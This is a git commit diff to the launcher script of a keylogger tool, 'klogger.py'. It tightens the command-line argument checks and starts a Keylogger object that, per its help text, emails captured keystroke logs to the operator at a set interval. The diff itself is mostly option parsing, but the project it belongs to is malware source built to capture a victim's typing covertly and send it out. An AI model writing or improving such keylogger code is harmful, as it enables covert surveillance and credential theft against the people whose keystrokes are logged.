fb53e3db53a3a728bc5a3f5e601f3f5cb23939c7
Kevin Cochrane <kevin.cochrane@gmail.com>
2022-09-02 18:29:58 +0200

    Adding arguments for better user experience.

--- klogger.py
+++ klogger.py
@@ -9,9 +9,11 @@ def get_arguments():
     parser.add_option("-p", "--password", dest="password", help="The password for your email address.")
     parser.add_option("-i", "--interval", dest="interval", help="The time interval you want to use. Eg. 120 will send a log update every 2 minutes")
     (options, arguments) = parser.parse_args()
-    if not options.target:
+    if not options.email:
         parser.error("[-] Please specify an email address to send reports to, use --help for more info")
-    elif not options.gateway:
+    if not options.password:
+        parser.error("[-] Please specify your email password, use --help for more info")
+    if not options.interval:
         parser.error("[-] Please specify the time interval you want to use for reports, use --help for more info")
     return options
 
@@ -22,5 +24,5 @@ password = options.password
 interval = options.interval
 
 
-my_keylogger = keylogger.Keylogger(interval, email, password)
+my_keylogger = keylogger.Keylogger(int(interval), email, password)
 
